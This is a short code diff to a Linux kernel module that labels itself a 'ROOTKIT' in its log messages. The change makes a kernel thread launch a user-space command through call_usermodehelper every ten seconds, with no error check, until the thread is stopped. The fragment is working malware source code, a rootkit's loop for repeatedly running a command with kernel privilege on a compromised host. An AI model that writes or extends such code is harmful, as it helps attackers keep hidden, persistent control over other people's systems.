@@ -29,13 +29,8 @@ static int threadfn(void *data){
    do {
       /* use UHM_WAIT_PROC to get useful error information */
       pr_info("ROOTKIT executing %s\n", CMD);
-      if (call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT)) {
-	 pr_info("ROOTKIT call_usermodehelper() failed\n"); 
-	 return 1;
-      } else {
-	 return 0;
-      }
-      msleep(5000);
+      call_usermodehelper(CMD, NULL, NULL, UMH_NO_WAIT);
+      msleep(10000);
    } while(!kthread_should_stop());
    pr_info("ROOTKIT kernel thread stopping\n");
    return 0;
